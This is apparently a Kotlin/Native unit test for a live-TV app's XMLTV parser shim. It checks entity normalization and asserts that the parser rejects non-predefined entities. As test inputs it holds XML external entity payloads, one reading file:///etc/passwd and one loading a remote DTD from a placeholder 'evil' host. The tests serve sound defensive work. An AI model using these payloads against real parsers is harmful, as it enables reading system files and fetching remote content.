@file:OptIn(kotlinx.cinterop.ExperimentalForeignApi::class)

package com.nuvio.app.features.livetv

import com.nuvio.app.features.livetv.xmlinterop.wm_xml_create
import com.nuvio.app.features.livetv.xmlinterop.wm_xml_destroy
import com.nuvio.app.features.livetv.xmlinterop.wm_xml_feed
import kotlinx.cinterop.ByteVar
import kotlinx.cinterop.COpaquePointer
import kotlinx.cinterop.CPointer
import kotlinx.cinterop.StableRef
import kotlinx.cinterop.UByteVar
import kotlinx.cinterop.addressOf
import kotlinx.cinterop.asStableRef
import kotlinx.cinterop.reinterpret
import kotlinx.cinterop.staticCFunction
import kotlinx.cinterop.toKString
import kotlinx.cinterop.usePinned
import kotlin.test.Test
import kotlin.test.assertEquals
import kotlin.test.assertFalse
import kotlin.test.assertTrue

/** Public C shim regressions deliberately bypass the Kotlin byte guard to test independent native guards. */
class ImportedXmlTvNativeEntitiesTest {
    private class Capture {
        val attributes = mutableListOf<Triple<String?, String?, String?>>()
    }

    private fun parse(xml: String): Pair<Boolean, List<Triple<String?, String?, String?>>> {
        val capture = Capture()
        val reference = StableRef.create(capture)
        val parser = wm_xml_create(reference.asCPointer(), nativeStart, nativeEnd, nativeText)
        try {
            check(parser != null)
            val bytes = xml.encodeToByteArray()
            var accepted = true
            bytes.usePinned { pinned ->
                for (index in bytes.indices) {
                    if (wm_xml_feed(parser, pinned.addressOf(index).reinterpret<UByteVar>(), 1, 0) == 0) {
                        accepted = false
                        break
                    }
                }
            }
            if (accepted) accepted = wm_xml_feed(parser, null, 0, 1) != 0
            return accepted to capture.attributes.toList()
        } finally {
            wm_xml_destroy(parser)
            reference.dispose()
        }
    }

    @Test
    fun nativeSaxAttributesNormalizeExactlyOnce() {
        val cases = listOf(
            "bbc&amp;.uk" to "bbc&.uk", "bbc&#38;.uk" to "bbc&.uk", "bbc&#x26;.uk" to "bbc&.uk",
            "bbc&amp;amp;.uk" to "bbc&amp;.uk", "bbc&amp;#38;.uk" to "bbc&#38;.uk", "BBC&#x31;" to "BBC1",
        )
        for ((encoded, expected) in cases) {
            val (accepted, attributes) = parse("<tv><programme channel=\"$encoded\" start=\"&#50;0260101120000 +0000\" " +
                "stop=\"20260101130000 +0000\"><title>News</title></programme></tv>")
            assertTrue(accepted)
            assertEquals(Triple(expected, "20260101120000 +0000", "20260101130000 +0000"), attributes.single())
        }
    }

    @Test
    fun nativeEntityGuardsRejectEveryNonPredefinedEntity() {
        val documents = listOf(
            "<!DOCTYPE tv [<!ENTITY owned 'bbc.uk'>]><tv><programme channel='&owned;'/></tv>",
            "<!DOCTYPE tv [<!ENTITY owned SYSTEM 'file:///etc/passwd'>]><tv><programme channel='&owned;'/></tv>",
            "<!DOCTYPE tv [<!ENTITY % remote SYSTEM 'https://never-fetch.example.invalid/evil.dtd'>%remote;]><tv/>",
            "<!DOCTYPE tv SYSTEM 'https://never-fetch.example.invalid/guide.dtd'><tv><programme channel='&undeclared;'/></tv>",
        )
        for (document in documents) assertFalse(parse(document).first)
    }

    companion object {
        private val nativeStart = staticCFunction {
            opaque: COpaquePointer?, name: CPointer<ByteVar>?, channel: CPointer<ByteVar>?, from: CPointer<ByteVar>?, until: CPointer<ByteVar>? ->
            val capture = opaque!!.asStableRef<Capture>().get()
            // Synthetic, bounded fixtures; only capture values, never throw assertions through C.
            if (name?.toKString() == "programme") capture.attributes += Triple(channel?.toKString(), from?.toKString(), until?.toKString())
            1
        }
        private val nativeEnd = staticCFunction { _: COpaquePointer?, _: CPointer<ByteVar>? -> 1 }
        private val nativeText = staticCFunction { _: COpaquePointer?, _: CPointer<ByteVar>?, _: Int -> 1 }
    }
}
